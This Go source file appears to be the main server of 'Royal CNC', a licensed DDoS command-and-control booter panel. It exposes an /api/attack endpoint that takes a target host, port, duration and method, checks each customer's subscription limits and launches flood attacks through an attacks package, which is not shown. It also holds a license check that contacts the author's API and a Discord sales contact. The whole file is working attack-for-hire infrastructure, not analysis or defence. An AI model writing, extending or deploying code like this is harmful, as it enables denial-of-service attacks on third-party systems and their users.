package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
	"webserver/src/attacks"
	"webserver/src/config"
	"webserver/src/database"
	"webserver/src/server"
	"webserver/src/server/commands"
	"webserver/src/utils"

	"github.com/gin-gonic/contrib/static"
	"github.com/gin-gonic/gin"
)

type LicenseResponse struct {
	StatusMsg      string `json:"status_msg"`
	StatusOverview string `json:"status_overview"`
	StatusCode     int    `json:"status_code"`
	StatusID       string `json:"status_id"`
	DiscordID      string `json:"discord_id"`
}

func Server(host string, port int) {
	if err := http.ListenAndServe(fmt.Sprintf("%s:%d", host, port), nil); err != nil {
		log.Fatal(err)
	}
}

func main() {

	if err := config.LoadConfig("config.json"); err != nil {
		log.Fatal(err)
	}
	// Check license
	if err := checkLicense(); err != nil {
		log.Fatal(err)
	}

	if err := database.ConnectDatabase(); err != nil {
		log.Fatal(err)
	}

	go server.Start()
	go commands.Init()
	log.Printf("(server) Starting Webserver!")

	router := gin.Default()
	router.Use(static.Serve("/", static.LocalFile("./static", true)))
	apigroup := router.Group("/api")
	{
		apigroup.GET("attack", apiattack)
		apigroup.GET("reload", reload)
	}

	router.Run(fmt.Sprintf("%s:%d", config.Cfg.Server.Host, config.Cfg.Server.Port))
}
func checkLicense() error {
	log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;178m Connection to Royal API System ...\u001B[0m")

	licenseKey := config.Cfg.LicenseKey
	product := "cnc"
	apiKey := "ApiKey-Here"
	apiUrl := "https://your-domain.net/api/client"

	if licenseKey == "" {
		return fmt.Errorf("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m A license key is missing in the configuration file.")
	}

	requestData := map[string]string{
		"licensekey": licenseKey,
		"product":    product,
	}
	requestDataJSON, err := json.Marshal(requestData)
	if err != nil {
		return fmt.Errorf("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error marshaling request data: %w", err)
	}

	req, err := http.NewRequest("POST", apiUrl, bytes.NewBuffer(requestDataJSON))
	if err != nil {
		return fmt.Errorf("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error creating HTTP request: %w", err)
	}
	req.Header.Set("Authorization", apiKey)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error sending HTTPS request: %w", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error reading response body: %w", err)
	}

	var licenseData LicenseResponse
	err = json.Unmarshal(body, &licenseData)
	if err != nil {
		return fmt.Errorf("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error parsing response body: %w", err)
	}

	if licenseData.StatusOverview == "success" {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;46m Royal CNC FREE VERSION is started and was created by \u001B[38;5;122m ~ Royaloakap ~ \u001B[38;5;46m Your license \u001B[38;5;230m", licenseKey, "\u001B[38;5;46m is valid.\u001B[38;5;230m")
	} else {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Your license \u001B[38;5;230m", licenseKey, "\u001B[38;5;196m is invalid or has reached a ceiling. Contact me on \u001B[38;5;122m discord.gg/RoyalC2 \u001B[38;5;230m or \u001B[38;5;122m @royaloakap.\u001B[38;5;230m")
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;46m Open a ticket on Discord.gg/RoyalC2\u001B[38;5;230m")
		return fmt.Errorf("license check failed")
	}
	return nil
}
func reload(c *gin.Context) {
	if err := config.LoadConfig("config.json"); err != nil {
		log.Print(err)
		c.JSON(400, gin.H{
			"error": "You Have An Error In Your Configuration File!",
		})
	}
}

func apiattack(c *gin.Context) {
	username := c.DefaultQuery("username", "")
	key := c.DefaultQuery("key", "")
	host := c.DefaultQuery("host", "")
	port := c.DefaultQuery("port", "")
	atttme := c.DefaultQuery("time", "")
	method := c.DefaultQuery("method", "")

	switch 0 {
	case len(username):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Username",
		})
		return
	case len(key):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Key",
		})
		return
	case len(host):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Host",
		})
		return
	case len(port):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Port",
		})
		return
	case len(atttme):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Attack Time",
		})
		return
	case len(method):
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid Method",
		})
		return
	}
	data, ok := database.CheckKeyUser(username, key)
	if ok != true {
		c.JSON(http.StatusUnauthorized, gin.H{
			"error": "Invalid Username/key",
		})
		return
	} else {
		if database.CheckBan(data.Username) {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Your Account Has Been Suspended / Banned If You Feel This is Wrong Please Contact the Owner",
			})
			return
		}

		if data.Expire < int(time.Now().Unix()) {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Your Account Has Expired!",
			})
			return
		}
		//
		if strings.HasPrefix(host, "http") {
			// dont parse host
		} else if net.ParseIP(host) == nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Invalid Host",
			})
			return
		}

		// check concurrents
		running := database.GetConcurrents(data.Username)
		if running >= data.Conns {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Max Concurrent Limit Reached",
			})
			return
		}

		tm, err := strconv.Atoi(atttme)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": "Time Is Not A Interger",
			})
			return
		}

		if tm > data.MaxTime {
			c.JSON(http.StatusBadRequest, gin.H{
				"error": fmt.Sprintf("Your Max Time Is %d", data.MaxTime),
			})
			return
		}
		methods, err := database.GetMethods()
		if err != nil {
			return
		}
		for _, m := range methods {
			methodsplit := strings.Split(m.Methods, ",")
			if utils.InArray(method, methodsplit) {
				// log attack
				if err := database.LogAttack(username, host, port, atttme, method); err != nil {
					c.JSON(http.StatusBadRequest, gin.H{
						"error": "Something went Wrong sending attack",
					})
					log.Printf("(log/err) %s", err)
					return
				} else {
					go attacks.Launch(data.Username, host, port, atttme, method)
					c.JSON(http.StatusOK, gin.H{
						"success": fmt.Sprint("true"),
						"host":    host,
						"port":    url.QueryEscape(port),
						"time":    url.QueryEscape(atttme),
						"method":  url.QueryEscape(method),
					})
				}
			} else {
				c.JSON(http.StatusBadRequest, gin.H{
					"error": "Method Does Not Exist",
				})
			}
		}
	}
}
